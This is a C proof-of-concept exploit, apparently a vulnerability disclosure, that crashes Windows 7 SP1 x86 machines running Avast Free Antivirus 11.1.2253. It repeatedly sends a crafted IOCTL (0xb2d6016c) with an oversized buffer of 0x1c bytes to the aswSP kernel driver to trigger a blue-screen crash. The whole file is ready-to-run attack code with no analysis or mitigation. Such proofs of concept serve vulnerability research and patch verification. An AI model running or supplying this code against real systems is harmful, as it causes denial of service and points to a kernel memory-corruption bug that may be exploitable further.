/**
* Author: bee13oy
* BSoD on Windows 7 SP1 x86 + Avast Free Antivirus (11.1.2253) with Special Pools enabled for aswSP.sys
**/

#include <Windows.h>

void BSoD3(const char* szDeviceName)
{
	HANDLE hFile = CreateFileA(szDeviceName,
		GENERIC_READ, 
		0, 
		NULL, 
		OPEN_EXISTING, 
		0, 
		NULL
		);

	if (hFile != INVALID_HANDLE_VALUE)
	{
#define IOCTL_NUMBER 0xb2d6016c
#define MAX_BUFSIZE 0x1000
		DWORD nbBytes = 0;
		CHAR bufOutput[MAX_BUFSIZE] = ""; 
		CHAR bufInput[MAX_BUFSIZE] = "";
		memset(bufInput, 0x1c, 0x00000a1f);
		DeviceIoControl(hFile, 
			IOCTL_NUMBER, 
			bufInput, 
			0x00000a1f, 
			bufOutput, 
			0x00000a1f, 
			&nbBytes, 
			NULL);
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	DWORD dwCount = 0;
	do 
	{
		BSoD3("\\\\.\\aswSP");
	} while (dwCount++ < 0x1000);

	return 0;
}

